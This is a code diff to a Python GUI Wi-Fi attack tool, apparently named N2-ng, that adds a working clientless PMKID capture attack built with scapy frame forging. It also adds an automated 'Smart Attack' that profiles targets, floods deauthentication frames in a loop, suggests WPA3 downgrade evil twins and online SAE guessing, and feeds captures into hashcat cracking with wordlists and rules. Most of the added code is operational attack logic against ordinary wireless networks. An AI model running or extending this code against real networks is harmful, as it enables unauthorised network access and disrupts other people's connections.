@@ -28,7 +28,7 @@ from tkinter import filedialog, messagebox, simpledialog, ttk
 try:
     from . import __version__
 except ImportError:
-    __version__ = "1.5.0"
+    __version__ = "1.6.0"
 
 
 THEME = {
@@ -380,20 +380,120 @@ def wpa02_record_keys(text: str) -> set[tuple[str, str, str]]:
     return keys
 
 
+# ------------------------------------------------------------------
+# Security profiling / attack routing (PMF-aware, WPA3-aware)
+# ------------------------------------------------------------------
+
+def security_profile(net: dict) -> dict:
+    """Derive a WPA2/WPA3/PMF profile from an airodump CSV network row.
+
+    PMF (802.11w) is mandatory for pure WPA3-SAE and typical-but-optional in
+    transition mode; airodump does not expose MFP flags directly, so WPA2 is
+    reported as "unknown" (deauth worth attempting).
+    """
+    privacy = (net.get("privacy") or "").upper()
+    cipher = (net.get("cipher") or "").upper()
+    auth = (net.get("auth") or "").upper()
+    sae = "SAE" in auth
+    psk = "PSK" in auth
+    wpa3 = sae or "WPA3" in privacy
+    transition = sae and psk
+    wep = "WEP" in privacy
+    open_net = "OPN" in privacy or "OPEN" in privacy
+    if open_net or wep:
+        pmf = "none"
+    elif wpa3 and not transition:
+        pmf = "required"
+    elif transition:
+        pmf = "capable"
+    else:
+        pmf = "unknown"
+    return {
+        "wpa3": wpa3,
+        "transition": transition,
+        "wep": wep,
+        "open": open_net,
+        "pmf": pmf,
+        "privacy": privacy or "?",
+        "cipher": cipher or "?",
+        "auth": auth or "?",
+    }
+
+
+def recommend_attack(profile: dict) -> list[dict]:
+    """Ordered attack plan for a security profile (research-driven routing).
+
+    PMKID is always tried first: clientless, quiet, and unaffected by PMF.
+    Deauth-based handshake capture is only suggested when PMF is not required.
+    """
+    if profile.get("open"):
+        return [{"id": "none", "why": "Open network — no handshake to capture (consider evil-twin/portal audit)."}]
+    if profile.get("wep"):
+        return [
+            {"id": "arpreplay", "why": "WEP: ARP-request replay to force IVs, then PTW crack (aircrack-ng)."},
+            {"id": "chopchop", "why": "WEP fallback: chopchop/fragmentation if ARP replay stalls."},
+        ]
+    plan = [{"id": "pmkid", "why": "Clientless PMKID request — quiet, no client needed, works under PMF."}]
+    if profile.get("transition"):
+        plan.append({"id": "downgrade", "why": "WPA3 transition mode: rogue WPA2-only twin forces fallback to crackable WPA2 handshake."})
+    if profile.get("pmf") == "required":
+        plan.append({"id": "sae-online", "why": "Pure WPA3-SAE + PMF: deauth blocked (802.11w) — online SAE guessing (wacker) or evil twin only."})
+    else:
+        plan.append({"id": "deauth_handshake", "why": "Deauth-connected clients to force a 4-way handshake capture."})
+    return plan
+
+
+# ------------------------------------------------------------------
+# PMKID (clientless) helpers — hashcat mode 22000, WPA*01 records
+# ------------------------------------------------------------------
+
+PMKID_KDE = b"\x00\x0f\xac\x04"  # RSN PMKID KDE (OUI 00:0f:ac, type 4)
+
+
+def extract_pmkid(frame: bytes) -> bytes | None:
+    """Pull a 16-byte PMKID out of a raw EAPOL frame (KDE 00-0F-AC-04)."""
+    idx = frame.find(PMKID_KDE)
+    if idx < 0:
+        return None
+    pmkid = frame[idx + len(PMKID_KDE):idx + len(PMKID_KDE) + 16]
+    if len(pmkid) != 16:
+        return None
+    return pmkid
+
+
+def build_pmkid_22000_line(pmkid: bytes, ap_mac: str, sta_mac: str, essid: str) -> str:
+    """Format a hashcat -m 22000 WPA*01 record from a captured PMKID."""
+    ap = ap_mac.replace(":", "").lower()
+    sta = sta_mac.replace(":", "").lower()
+    return f"WPA*01*{pmkid.hex()}*{ap}*{sta}*{essid.encode().hex()}***"
+
+
+def pmkid_output_path(essid: str, bssid: str) -> Path:
+    base = capture_root() / sanitize_essid(essid, bssid)
+    base.mkdir(parents=True, exist_ok=True)
+    candidate = base / f"pmkid_{time.strftime('%Y-%m-%d_%H-%M-%S')}.22000"
+    return unique_path(candidate)
+
+
 def default_hashcat_wordlist() -> Path | None:
     wordlist = Path("/usr/share/wordlists/rockyou.txt")
     return wordlist if wordlist.exists() else None
 
 
-def build_hashcat_command(hash_file: Path, wordlist: Path | None, attack_mode: str = "0", mask: str | None = None, session: str | None = None) -> list[str]:
+def build_hashcat_command(hash_file: Path, wordlist: Path | None, attack_mode: str = "0", mask: str | None = None, session: str | None = None, rules: Path | None = None, nonce_error_corrections: int | None = None) -> list[str]:
     cmd = ["hashcat", "-m", "22000", "-a", attack_mode]
     if session:
         cmd.extend(["--session", session])
+    if nonce_error_corrections is not None:
+        # hashcat v7: override nonce-error handling for noisy PMKID/handshake captures.
+        cmd.append(f"--nonce-error-corrections={int(nonce_error_corrections)}")
     cmd.append(str(hash_file))
     if attack_mode == "0":
         if wordlist is None:
             raise ValueError("Dictionary attack requires a wordlist.")
         cmd.append(str(wordlist))
+        if rules is not None:
+            cmd.extend(["-r", str(rules)])
     elif attack_mode == "3":
         if not mask:
             raise ValueError("Mask attack requires an explicit mask.")
@@ -1420,6 +1520,193 @@ class AttackController:
         self._spawn(cmd)
 
 
+class PmkidAttacker(threading.Thread):
+    """Clientless PMKID capture via scapy (Steube/hashcat 2018 attack).
+
+    Sends an open-system auth + RSN association request to the AP; APs with
+    PMKID caching (roaming) answer with an EAPOL M1 containing the PMKID.
+    No connected client is required and PMF (802.11w) does not protect M1.
+    Writes a hashcat -m 22000 (WPA*01) file on success.
+    """
+
+    # Minimal RSN IE: WPA2-PSK/CCMP. Version 1, group CCMP, 1 pairwise CCMP,
+    # 1 AKM PSK, capabilities 0.
+    RSN_IE = bytes.fromhex("0100" "000fac04" "0100" "000fac04" "0100" "000fac02" "0000")
+
+    def __init__(self, bssid: str, essid: str, mon_iface: str, sta_mac: str, output_path: Path, log_func, event_queue: queue.Queue | None = None, attempts: int = 3, timeout: int = 12):
+        super().__init__(daemon=True)
+        self.bssid = bssid
+        self.essid = essid
+        self.mon_iface = mon_iface
+        self.sta_mac = sta_mac
+        self.output_path = output_path
+        self.log = log_func
+        self.queue = event_queue
+        self.attempts = attempts
+        self.timeout = timeout
+        self.result_path: Path | None = None
+        self._stop = threading.Event()
+
+    def stop(self):
+        self._stop.set()
+
+    def _frames(self):
+        from scapy.all import Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt, RadioTap
+        dot11 = Dot11(addr1=self.bssid, addr2=self.sta_mac, addr3=self.bssid)
+        auth = RadioTap() / dot11 / Dot11Auth(algo=0, seqnum=1, status=0)
+        assoc = (
+            RadioTap()
+            / Dot11(addr1=self.bssid, addr2=self.sta_mac, addr3=self.bssid)
+            / Dot11AssoReq(cap=0x1104, listen_interval=10)
+            / Dot11Elt(ID="SSID", info=self.essid.encode())
+            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
+            / Dot11Elt(ID="RSNinfo", info=self.RSN_IE)
+        )
+        return auth, assoc
+
+    def _pmkid_from_packet(self, pkt) -> bytes | None:
+        try:
+            from scapy.all import Dot11
+            if not pkt.haslayer(Dot11):
+                return None
+            dot11 = pkt[Dot11]
+            if (dot11.addr2 or "").lower() != self.bssid.lower():
+                return None
+            return extract_pmkid(bytes(pkt))
+        except Exception:
+            return None
+
+    def run(self):
+        try:
+            from scapy.all import sendp, sniff
+        except ImportError:
+            self.log("PMKID attack requires scapy (pip install scapy).")
+            return
+        try:
+            auth, assoc = self._frames()
+        except Exception as exc:
+            self.log(f"PMKID frame build failed: {exc}")
+            return
+        self.log(f"PMKID clientless attack on {self.bssid} ({self.attempts} attempt(s))")
+        for attempt in range(1, self.attempts + 1):
+            if self._stop.is_set():
+                self.log("PMKID attack stopped.")
+                return
+            try:
+                sendp(auth, iface=self.mon_iface, verbose=0)
+                time.sleep(0.3)
+                sendp(assoc, iface=self.mon_iface, verbose=0)
+            except OSError as exc:
+                self.log(f"PMKID transmit failed: {exc}")
+                return
+            deadline = time.monotonic() + self.timeout
+            while time.monotonic() < deadline and not self._stop.is_set():
+                pkts = sniff(
+                    iface=self.mon_iface,
+                    timeout=min(2.0, max(0.1, deadline - time.monotonic())),
+                    filter="ether proto 0x888e",
+                    store=True,
+                )
+                for pkt in pkts:
+                    pmkid = self._pmkid_from_packet(pkt)
+                    if not pmkid:
+                        continue
+                    line = build_pmkid_22000_line(pmkid, self.bssid, self.sta_mac, self.essid)
+                    try:
+                        self.output_path.write_text(line + "\n")
+                    except OSError as exc:
+                        self.log(f"PMKID write failed: {exc}")
+                        return
+                    self.result_path = self.output_path
+                    self.log(f"PMKID captured -> {self.output_path}")
+                    if self.queue is not None:
+                        self.queue.put(("pmkid_file", str(self.output_path)))
+                    return
+            self.log(f"PMKID attempt {attempt}/{self.attempts}: no PMKID (AP may not cache PMKIDs)")
+        self.log("PMKID attack finished: AP did not return a PMKID.")
+
+
+class SmartAttackOrchestrator(threading.Thread):
+    """PMF-aware adaptive attack chain (research-driven routing).
+
+    1. Profile the target (WPA3 / transition / PMF / WEP).
+    2. PMKID first: quiet, clientless, PMF-immune.
+    3. Deauth handshake capture only when PMF is not required; otherwise
+       log the correct pivot (downgrade twin / online SAE) instead of
+       wasting deauths that 802.11w silently drops.
+    """
+
+    def __init__(self, net: dict, mon_iface: str, sta_mac: str, attack: AttackController, capture_manager: "CaptureManager", log_func, clients: list[str] | None = None, interval: int = 15, pmkid_timeout: int = 12):
+        super().__init__(daemon=True)
+        self.net = net
+        self.mon_iface = mon_iface
+        self.sta_mac = sta_mac
+        self.attack = attack
+        self.capture_manager = capture_manager
+        self.log = log_func
+        self.clients = clients or []
+        self.interval = interval
+        self.pmkid_timeout = pmkid_timeout
+        self._stop = threading.Event()
+        self.pmkid_attacker: PmkidAttacker | None = None
+
+    def stop(self):
+        self._stop.set()
+        if self.pmkid_attacker:
+            self.pmkid_attacker.stop()
+
+    def _sleep(self, seconds: float) -> bool:
+        """Sleep in slices; return False if stopped."""
+        deadline = time.monotonic() + seconds
+        while time.monotonic() < deadline:
+            if self._stop.is_set():
+                return False
+            time.sleep(0.2)
+        return True
+
+    def run(self):
+        profile = security_profile(self.net)
+        bssid = self.net["bssid"]
+        essid = self.net.get("essid", "")
+        kind = "WPA3-transition" if profile["transition"] else ("WPA3" if profile["wpa3"] else profile["privacy"])
+        self.log(f"Smart Attack: {essid} ({bssid}) — {kind}, PMF {profile['pmf']}")
+        for step in recommend_attack(profile):
+            self.log(f"  plan: {step['id']} — {step['why']}")
+        if profile["open"] or profile["wep"]:
+            return
+
+        # Stage 1: clientless PMKID (works regardless of PMF).
+        self.pmkid_attacker = PmkidAttacker(
+            bssid, essid, self.mon_iface, self.sta_mac,
+            pmkid_output_path(essid, bssid), self.log, attempts=2, timeout=self.pmkid_timeout,
+        )
+        self.pmkid_attacker.start()
+        while self.pmkid_attacker.is_alive() and not self._stop.is_set():
+            time.sleep(0.2)
+        if self.pmkid_attacker.result_path:
+            return
+        if self._stop.is_set():
+            self.log("Smart Attack stopped.")
+            return
+
+        # Stage 2: deauth handshake capture — only if PMF won't eat the frames.
+        if profile["pmf"] == "required":
+            if profile["transition"]:
+                self.log("PMF enforced, transition mode: pivot to a WPA2-only evil twin (downgrade) for a crackable handshake.")
+            else:
+                self.log("PMF enforced (pure WPA3-SAE): deauth is blocked by 802.11w. Options: retry PMKID, online SAE guessing (wacker), or evil twin.")
+            return
+        self.log(f"PMKID unavailable — falling back to deauth every {self.interval}s until a handshake is captured.")
+        while not self._stop.is_set():
+            if self.capture_manager.handshake_found or self.capture_manager.pmkid_found:
+                self.log("Smart Attack: capture obtained, stopping deauth loop.")
+                return
+            self.attack.deauth_all(bssid, self.mon_iface, count=5, clients=self.clients)
+            if not self._sleep(self.interval):
+                self.log("Smart Attack stopped.")
+                return
+
+
 class CaptureManager:
     """Manage capture files, poll .cap for handshake/PMKID, and convert to .22000."""
 
@@ -1508,10 +1795,9 @@ class CaptureManager:
             self.queue.put(("handshake", {"file": str(path), "type": "handshake", "note": "full handshake (verified)"}))
         elif verdict == VERDICT_CHALLENGE and not self.handshake_found:
             # M1+M2 only: crackable but unverified (may be a failed auth).
-            # Still counts as a capture: report it and stop auto-deauth.
+            # Log a warning and keep capturing (do not stop auto-deauth).
             self.challenge_seen = True
-            self.handshake_found = True
-            self.queue.put(("handshake", {"file": str(path), "type": "handshake", "note": "M1+M2 (crackable, unverified)"}))
+            self.queue.put(("challenge", {"file": str(path), "type": "handshake", "note": "M1+M2 (crackable, unverified)"}))
         if "WPA*01" in text and not self.pmkid_found:
             self.pmkid_found = True
             self.queue.put(("pmkid", {"file": str(path), "type": "pmkid"}))
@@ -1755,13 +2041,27 @@ class HashcatDialog(tk.Toplevel):
         tk.Label(self, text="Hashcat dictionary attack", bg=THEME["panel"], fg=THEME["fg"], font=("TkDefaultFont", 12, "bold")).pack(anchor=tk.W, padx=10, pady=(10, 4))
         self.hash_var = tk.StringVar(value=str(hash_file))
         self.wordlist_var = tk.StringVar(value=str(default_hashcat_wordlist() or ""))
-        for label, var in (("Hash file:", self.hash_var), ("Wordlist:", self.wordlist_var)):
+        self.rules_var = tk.StringVar(value="")
+        self.nonce_enabled = tk.BooleanVar(value=False)
+        self.nonce_var = tk.IntVar(value=64)
+        for label, var in (("Hash file:", self.hash_var), ("Wordlist:", self.wordlist_var), ("Rules file:", self.rules_var)):
             row = tk.Frame(self, bg=THEME["panel"])
             row.pack(fill=tk.X, padx=10, pady=2)
             tk.Label(row, text=label, bg=THEME["panel"], fg=THEME["fg"], width=10, anchor=tk.W).pack(side=tk.LEFT)
             tk.Entry(row, textvariable=var, bg=THEME["bg"], fg=THEME["fg"]).pack(side=tk.LEFT, fill=tk.X, expand=True)
-            if label == "Wordlist:":
-                tk.Button(row, text="Browse", command=self._browse_wordlist, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=4)
+            if label in ("Wordlist:", "Rules file:"):
+                tk.Button(row, text="Browse", command=lambda v=var: self._browse_file(v), bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=4)
+
+        nonce_row = tk.Frame(self, bg=THEME["panel"])
+        nonce_row.pack(fill=tk.X, padx=10, pady=2)
+        tk.Checkbutton(
+            nonce_row,
+            text="Nonce error correction (noisy captures):",
+            variable=self.nonce_enabled,
+            command=self._update_preview,
+            bg=THEME["panel"], fg=THEME["fg"], selectcolor=THEME["panel"],
+        ).pack(side=tk.LEFT)
+        tk.Spinbox(nonce_row, from_=0, to=1024, increment=8, width=6, textvariable=self.nonce_var, command=self._update_preview).pack(side=tk.LEFT, padx=4)
 
         self.preview_var = tk.StringVar()
         tk.Label(self, textvariable=self.preview_var, bg=THEME["panel"], fg=THEME["fg"], anchor=tk.W, justify=tk.LEFT, wraplength=780).pack(fill=tk.X, padx=10, pady=4)
@@ -1775,16 +2075,26 @@ class HashcatDialog(tk.Toplevel):
         self.stop_btn.pack(side=tk.LEFT, padx=5)
         tk.Button(buttons, text="Close", command=self.destroy, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.RIGHT)
         self.wordlist_var.trace_add("write", lambda *_args: self._update_preview())
+        self.rules_var.trace_add("write", lambda *_args: self._update_preview())
         self._update_preview()
         bind_mousewheel(self, self.output)
 
-    def _browse_wordlist(self):
-        path = filedialog.askopenfilename(parent=self, title="Select wordlist")
+    def _browse_file(self, var: tk.StringVar):
+        path = filedialog.askopenfilename(parent=self, title="Select file")
         if path:
-            self.wordlist_var.set(path)
+            var.set(path)
+
+    def _browse_wordlist(self):
+        self._browse_file(self.wordlist_var)
 
     def _command(self) -> list[str]:
-        return build_hashcat_command(Path(self.hash_var.get()), Path(self.wordlist_var.get()), session=self.session_name)
+        rules_text = self.rules_var.get().strip()
+        rules = Path(rules_text) if rules_text else None
+        nonce = int(self.nonce_var.get()) if self.nonce_enabled.get() else None
+        return build_hashcat_command(
+            Path(self.hash_var.get()), Path(self.wordlist_var.get()),
+            session=self.session_name, rules=rules, nonce_error_corrections=nonce,
+        )
 
     def _update_preview(self):
         try:
@@ -2192,6 +2502,8 @@ class N2NgApp:
         self.worker = AirodumpWorker(self.queue, self.settings)
         self.capture_manager = CaptureManager(self.queue, self._log)
         self.attack = AttackController(lambda msg: self.queue.put(("log", msg)))
+        self._pmkid_attacker: PmkidAttacker | None = None
+        self._smart_worker: SmartAttackOrchestrator | None = None
 
         self.networks: dict[str, dict] = {}
         self._networks_prev: dict[str, dict] = {}
@@ -2547,6 +2859,8 @@ class N2NgApp:
         tk.Button(self.attack_frame, text="Deauthenticate All Clients", command=self._deauth_all, bg="#333333", fg=THEME["accent"], font=self._ui_font_bold).pack(fill=tk.X, padx=5, pady=3)
         tk.Button(self.attack_frame, text="Deauthenticate Specific Client", command=self._deauth_client, bg="#333333", fg=THEME["accent"], font=self._ui_font_bold).pack(fill=tk.X, padx=5, pady=3)
         tk.Button(self.attack_frame, text="Reaver WPS Attack", command=self._reaver_attack, bg="#333333", fg=THEME["accent"], font=self._ui_font_bold).pack(fill=tk.X, padx=5, pady=3)
+        tk.Button(self.attack_frame, text="PMKID Attack (Clientless)", command=self._pmkid_attack, bg="#333333", fg=THEME["accent"], font=self._ui_font_bold).pack(fill=tk.X, padx=5, pady=3)
+        tk.Button(self.attack_frame, text="Smart Attack (Auto)", command=self._smart_attack, bg="#333333", fg=THEME["accent"], font=self._ui_font_bold).pack(fill=tk.X, padx=5, pady=3)
         tk.Button(self.attack_frame, text="Stop Attack", command=self._stop_attack, bg=THEME["error"], fg="#ffffff", font=self._ui_font_bold).pack(fill=tk.X, padx=5, pady=3)
 
         self.legacy_visible = tk.BooleanVar(value=False)
@@ -3226,6 +3540,18 @@ class N2NgApp:
             f"Power: {net.get('power', '')} dBm",
             f"Privacy: {net.get('privacy', '')} / {net.get('cipher', '')} / {net.get('auth', '')}",
         ])
+        profile = security_profile(net)
+        if profile["open"]:
+            kind = "Open"
+        elif profile["wep"]:
+            kind = "WEP"
+        elif profile["transition"]:
+            kind = "WPA3-transition"
+        elif profile["wpa3"]:
+            kind = "WPA3"
+        else:
+            kind = "WPA2"
+        lines.append(f"Profile: {kind} | PMF: {profile['pmf']}")
         self.target_label.config(text="\n".join(lines))
 
     def _start_capture_size_monitor(self):
@@ -3314,9 +3640,60 @@ class N2NgApp:
         if self._confirm_attack(cmd):
             self.attack.reaver(bssid, channel, self.mon_iface)
 
+    def _pmkid_attack(self):
+        if not self.locked_target or not self.mon_iface:
+            messagebox.showwarning("N2-ng", "Lock a target first.")
+            return
+        sta_mac = self._our_mac()
+        if not sta_mac:
+            messagebox.showwarning("N2-ng", "Could not determine our MAC address.")
+            return
+        if self._pmkid_attacker and self._pmkid_attacker.is_alive():
+            messagebox.showwarning("N2-ng", "A PMKID attack is already running.")
+            return
+        bssid = self.locked_target["bssid"]
+        essid = self.locked_target.get("essid", "")
+        cmd = ["pmkid-attack", "-a", bssid, "-h", sta_mac, self.mon_iface]
+        if not self._confirm_attack(cmd):
+            return
+        out = pmkid_output_path(essid, bssid)
+        self._pmkid_attacker = PmkidAttacker(
+            bssid, essid, self.mon_iface, sta_mac, out,
+            lambda msg: self.queue.put(("log", msg)), event_queue=self.queue,
+        )
+        self._pmkid_attacker.start()
+        self._log(f"PMKID clientless attack started on {essid} ({bssid})")
+
+    def _smart_attack(self):
+        if not self.locked_target or not self.mon_iface:
+            messagebox.showwarning("N2-ng", "Lock a target first.")
+            return
+        sta_mac = self._our_mac()
+        if not sta_mac:
+            messagebox.showwarning("N2-ng", "Could not determine our MAC address.")
+            return
+        if self._smart_worker and self._smart_worker.is_alive():
+            messagebox.showwarning("N2-ng", "A Smart Attack is already running.")
+            return
+        bssid = self.locked_target["bssid"]
+        cmd = ["smart-attack", "-a", bssid, self.mon_iface]
+        if not self._confirm_attack(cmd):
+            return
+        self._smart_worker = SmartAttackOrchestrator(
+            self.locked_target, self.mon_iface, sta_mac,
+            self.attack, self.capture_manager,
+            lambda msg: self.queue.put(("log", msg)),
+            clients=self._target_client_macs(bssid),
+        )
+        self._smart_worker.start()
+
     def _stop_attack(self):
         self.auto_deauth_var.set(False)
         stopped = self.attack.stop_all()
+        for worker in (self._pmkid_attacker, self._smart_worker):
+            if worker and worker.is_alive():
+                worker.stop()
+                stopped += 1
         text = f"All attack processes stopped ({stopped} killed)" if stopped else "No attack process running"
         self.status.config(text=text, bg=THEME["panel"], fg=THEME["fg"])
         self._log(text)
@@ -3384,6 +3761,9 @@ class N2NgApp:
                     self._on_convert_done(payload)
                 elif event == "pmkid":
                     self._notify_capture("PMKID Captured", payload["file"])
+                elif event == "pmkid_file":
+                    self._notify_capture("PMKID Captured", payload)
+                    self._refresh_history(select_path=Path(payload))
                 elif event == "wps_line":
                     self.wps_lines.append(payload)
                     self._update_wps_text()
